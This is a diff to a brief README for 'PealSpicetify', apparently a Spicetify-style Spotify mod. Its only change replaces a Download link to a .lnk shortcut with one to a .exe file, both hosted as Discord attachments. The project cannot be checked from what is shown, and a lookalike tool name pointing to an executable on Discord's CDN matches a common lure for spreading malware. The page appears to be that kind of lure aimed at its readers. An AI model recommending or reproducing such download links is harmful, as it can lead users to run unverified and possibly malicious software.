@@ -1,6 +1,6 @@
 # PealSpicetify
 
-[Download](https://cdn.discordapp.com/attachments/871430241065795638/1077207575860363364/PealSpicetify.lnk)
+[Download](https://cdn.discordapp.com/attachments/871430241065795638/1077265105902911590/pealspicetify.exe)
 
 Screenshot:
 
